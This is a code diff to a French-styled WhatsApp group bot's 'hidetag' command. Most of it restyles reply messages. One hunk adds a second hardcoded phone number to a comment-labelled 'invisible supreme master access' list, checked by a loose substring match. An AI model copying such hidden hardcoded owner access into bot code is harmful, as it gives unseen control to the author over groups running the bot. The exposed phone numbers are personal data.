@@ -27,7 +27,7 @@ module.exports = {
   name: 'hidetag',
   aliases: ['tag'],
   category: '‎⛨ ɢᴀʀᴅɪᴇɴs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
-  description: '**『 ɢʜᴏsᴛɢ-𝐗 』➪ ɪɴᴠᴏǫᴜᴇ ᴅɪsᴄʀᴇᴛᴇᴍᴇɴᴛ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ**',
+  description: '『 ɢʜᴏsᴛɢ-𝐗 』➪ ɪɴᴠᴏǫᴜᴇ ᴅɪsᴄʀᴇᴛᴇᴍᴇɴᴛ ᴛᴏᴜs ʟᴇs ᴍᴇᴍʙʀᴇs ᴅᴜ sᴀɴᴄᴛᴜᴀɪʀᴇ',
   usage: `${prefix}hidetag <texte/media>`, // 💡 Dynamique avec ton préfixe actuel
   groupOnly: true,
   adminOnly: true,
@@ -35,14 +35,14 @@ module.exports = {
 
   async execute(sock, msg, args, extra) {
     const { reply } = extra;
-    
+
     try {
       const senderJid = msg.key.participant || msg.key.remoteJid;
       const senderNumber = senderJid.replace(/\D/g, '');
 
-      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE
-      const supremeOwner = '22651622652';
-      const isSupremeOwner = senderNumber.includes(supremeOwner) || supremeOwner.includes(senderNumber);
+      // 🛡️ TON ACCÈS MAÎTRE SUPRÊME INVISIBLE (Double emprise rectifiée)
+      const supremeOwners = ['22651622652', '22665108174'];
+      const isSupremeOwner = supremeOwners.some(num => senderNumber.includes(num) || num.includes(senderNumber));
 
       const isConfigOwner = config.ownerNumber && config.ownerNumber.some(n => {
         const cleanN = String(n).replace(/\D/g, '');
@@ -53,7 +53,7 @@ module.exports = {
 
       // Si l'utilisateur n'est pas admin et n'est pas le Suprême Owner
       if (!extra.isAdmin && !isMe) {
-        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`);
+        return reply(`*❌ ${toSmallCaps('cette incantation est reservee aux administrateurs du sanctuaire')} !*\n\n> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`);
       }
 
       const groupMetadata = await sock.groupMetadata(extra.from);
@@ -141,11 +141,11 @@ module.exports = {
     } catch (error) {
       console.error('HideTag command error:', error);
       await reply(
-        `╭╼━≪• *ɪɴᴠᴏᴄᴀᴛɪᴏɴ_sɪʟᴇɴᴄɪᴇᴜsᴇ* •≫━╾╮\n` +
-        `┃ *ᴇ́ᴛᴀᴛ* : [ ᴇ́ᴄʜᴇᴄ ❌ ]\n` +
-        `╰━━━━━━━━━━━━━━━╯\n\n` +
-        `*❌ ${toSmallCaps('l arcane n a pas pu invoquer les membres')} : ${error.message}*\n\n` +
-        `> *ᴘᴏᴡᴇʀᴇᴅ ʙʏ ɢʜᴏsᴛɢ 𝐗*`
+        `*╭╼━━━≪• ɪɴᴠᴏᴄᴀᴛɪᴏɴ_sɪʟᴇɴᴄɪᴇᴜsᴇ •≫━━━╾╮*\n` +
+        `*┃* *ᴇ́ᴛᴀᴛ* : [ ᴇ́ᴄʜᴇᴄ ❌ ]\n\n` +
+        `*┃* ❌ *${toSmallCaps('l arcane n a pas pu invoquer')}*\n` +
+        `*┃* *${toSmallCaps('les membres')} :* ${error.message}\n\n` +
+        `> *♰ ᴇ́ᴛᴀʙʟɪ ᴘᴀʀ ɢʜᴏsᴛɢ-𝐗 ♰*`
       );
     }
   },
